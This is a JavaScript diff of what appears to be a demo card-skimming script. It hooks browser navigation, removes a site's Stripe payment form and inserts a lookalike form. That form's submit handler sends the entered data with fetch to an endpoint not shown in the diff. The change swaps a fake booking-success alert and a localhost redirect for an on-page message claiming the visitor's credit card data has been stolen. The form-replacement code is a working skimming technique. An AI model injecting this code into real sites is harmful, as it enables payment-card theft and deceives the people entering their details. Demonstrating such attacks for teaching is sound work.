@@ -12,14 +12,14 @@ async function mimicSubmitForm(e) {
     body: JSON.stringify(parsedData),
   });
 
-  // const result = await response.json();
-  alert("Booking successful!!!");
-  window.location.href = "http://localhost:5173";
+  const root = document.getElementById("root");
+  root.innerHTML =
+    '<p style="color: red; font-size: 48px; text-align: center; margin-top: 20%;">Hi, I am a hacker and I\'ve just stolen your credit card data. I am gong for a shopping. BYE!!!</p>';
 }
 
 function getMaliciousContent() {
   const formHtml = `
-    <form onsubmit="mimicSubmitForm(event);">
+    <form id="custom-form" onsubmit="mimicSubmitForm(event);">
         <div style="color: #000; position: relative; display: flex; justify-content: flex-start; align-items: center; padding: 12px; margin-bottom: 24px; background-color: #f8fafc; border-radius: 8px; border: 1px solid #e2e8f0;">
             <div style="display: flex; justify-content: flex-start; align-items: center;">
                 <div style="display: flex; flex-direction: column; height: 100%; text-align: center; width: 1.5em;">
@@ -86,9 +86,10 @@ function init() {
     originalPushState.apply(this, args);
 
     setTimeout(() => {
-      const stripeContent = document.getElementById("stripe-content");
-      stripeContent.childNodes.forEach((child) => child.remove());
-      stripeContent.innerHTML = getMaliciousContent();
+      const stripeForm = document.getElementById("stripe-form");
+      const stripeContainer = stripeForm.parentElement;
+      stripeForm.remove();
+      stripeContainer.innerHTML = getMaliciousContent();
     }, 10);
   };
 }
